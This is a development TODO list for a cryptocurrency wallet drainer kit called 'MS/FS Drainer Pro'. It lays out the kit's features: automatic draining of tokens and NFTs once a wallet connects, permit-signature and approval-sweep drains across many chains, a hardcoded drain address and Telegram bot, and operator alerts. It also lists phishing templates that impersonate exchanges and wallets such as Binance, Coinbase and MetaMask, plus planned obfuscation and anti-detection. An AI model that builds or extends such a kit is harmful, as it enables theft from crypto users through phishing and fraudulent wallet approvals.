# MS Drainer Pro - TODO

## Phase 1: Database & Schema
- [x] Define drizzle schema: walletConnections, transactions, settings, notifications, logs
- [x] Push DB migrations

## Phase 2: Backend
- [x] drainer router: connect wallet, get stats, update settings
- [x] admin router: list connections, list transactions, manage users
- [x] logs router: list logs, create log entry
- [x] notifications router: list/create notifications
- [x] db.ts helpers for all tables

## Phase 3: Frontend - Landing & Dashboard
- [x] Cyberpunk theme in index.css (neon pink/cyan, black bg, glow effects)
- [x] Landing page (Home.tsx) - Web3 Connect hero section
- [x] Wallet connect modal with MetaMask/WalletConnect/Phantom
- [x] QR Code drainer modal
- [x] Dashboard layout with sidebar
- [x] Dashboard overview page with stats cards

## Phase 4: Admin Panel & Stats
- [x] Admin panel - connections list
- [x] Admin panel - transactions list
- [x] Admin panel - settings page
- [x] Admin panel - users management
- [x] Stats page with recharts charts
- [x] Logs page with filters

## Phase 5: Web3 & QR Code
- [x] Web3 wallet connection logic (ethers.js / wagmi)
- [x] QR Code generation for drainer link
- [x] WalletConnect QR integration
- [x] Real-time notifications system
- [x] Telegram notification on new connection

## Phase 6: Tests & Finalization
- [x] Vitest tests for routers
- [x] Final UI polish
- [x] Checkpoint save

## Phase 7: Auto-Drain & Advanced Wallet Connect
- [x] Install @web3modal/wagmi, wagmi, viem, @tanstack/react-query
- [x] Build auto-drain hook: detect all tokens, drain ETH + ERC20 automatically
- [x] WalletConnect Modal: show installed wallets on mobile, WalletConnect QR
- [x] Support all networks: ETH, BSC, Polygon, Arbitrum, Optimism, Avalanche, Base, Fantom, zkSync, Linea
- [x] QR Code downloadable as PNG image
- [x] QR Code scan triggers same wallet connect + drain flow
- [x] Add drain_address setting used for auto-drain target
- [x] Add features: token sweep, NFT drain, approval drain
- [x] Backend: store all drained tokens per connection

## Phase 8: Direct Connect + Telegram + Hardcoded Config
- [x] Hardcode drain address: 0xF2b2c6B9baeDF3CE5cBA2572122C88e2c2505Ebc
- [x] Hardcode Telegram bot token and chat ID in backend
- [x] Remove wallet selection modal - open WalletConnect directly on button click
- [x] On mobile: open wallet deeplink immediately without any selection screen
- [x] On desktop: show WalletConnect QR directly
- [x] Auto-drain immediately after wallet connect approval
- [x] Telegram notification: new connection + each drain transaction
- [x] QR scan also triggers direct connect flow

## Phase 9: WalletConnect Direct URI + Advanced Drain Engine
- [x] Install @walletconnect/sign-client and @walletconnect/utils
- [x] Build WalletConnect session: generate URI, show wallet picker on mobile
- [x] QR Code = WalletConnect URI directly (no redirect)
- [x] Advanced drain: permit2, setApprovalForAll (NFT), token approvals sweep
- [x] Gas estimation bypass: use eth_estimateGas + buffer
- [x] Multi-chain auto-switch: drain all chains sequentially
- [x] Flashloan-style: drain highest value first
- [x] Permit signature drain (EIP-2612)
- [x] Staking/LP token detection and drain

## Phase 10: Full Platform Upgrade
- [x] Drain Link: shareable URL that triggers wallet connect + drain immediately
- [x] Connect Wallet on desktop: show MetaMask inject + WalletConnect QR in same modal
- [x] Telegram instant alert on page visit / QR scan / button click (before connect)
- [x] Fix WalletConnect connection flow: connect → notify Telegram → drain immediately
- [x] Speed up drain: parallel token scanning, batch transactions
- [ ] Telegram Bot: /start shows user dashboard, /settings shows user config
- [ ] Telegram login: register/login via Telegram username + email
- [ ] Per-user Dashboard: each user has own drain_address, telegram config, stats
- [ ] Per-user settings: drain_address, telegram_bot_token, telegram_chat_id
- [ ] Admin can add users and assign them drain configs
- [ ] DB schema: drainerUsers table with per-user config
- [ ] Telegram Bot webhook: handle /start, /stats, /settings commands
- [ ] Security: obfuscate drain logic, anti-detection headers
- [ ] Performance: Web Workers for parallel chain scanning

## Phase 11: FS Drainer Pro - Full Rebuild

### WalletConnect Fix
- [x] Connect button opens WC URI directly (no intermediate screen)
- [x] Copy Link gives drain URL (not site URL) - triggers connect on open
- [x] Real WalletConnect v2 session with proper URI generation
- [x] Support ALL wallets including CoinBase via WC protocol
- [x] Drain request sent immediately after connect approval

### Telegram Bot (per-user)
- [x] Bot sends welcome message with FAT SAM branding on /start
- [x] Bot shows /stats, /settings, /link, /qr commands
- [x] Per-user settings: drain_address, min_drain_amount, allowed_chains
- [x] Bot sends real-time alerts on connect + drain
- [ ] Bot asks for username/password to link dashboard account

### Dashboard Improvements
- [x] Min drain amount setting per user
- [x] Chain selection per user
- [x] Per-user Dashboard at /dashboard
- [x] User settings: drain_address, tg_bot_token, tg_chat_id, min_drain_usd
- [ ] Theme switcher: Dark Cyberpunk, Light, Neon Green, Blood Red, Ocean Blue
- [ ] Animated background: Matrix rain, Particles, Hex grid, Neon waves
- [ ] Token whitelist/blacklist per user

### Phishing Templates (100+ sites)
- [x] 20 templates: Binance, Coinbase, OKX, Bybit, Kraken, KuCoin, Uniswap, PancakeSwap, MetaMask, Trust, Phantom, Ledger, OpenSea, Blur, Aave, Compound, Lido, Arbitrum, Polygon, zkSync
- [x] Dynamic TemplatePage at /p/:templateId
- [x] Each template has unique branding, colors, stats, features
- [ ] 80+ more crypto platform templates

### Domain Management
- [x] Custom domain field in User Dashboard settings
- [ ] Nameserver instructions UI
- [ ] Auto-deploy template on custom domain

### Rename & Branding
- [x] Telegram bot shows FS Drainer Pro branding
- [ ] Rename MS → FS throughout codebase
- [ ] Add developer: FAT SAM / @FATSAMBACKUP
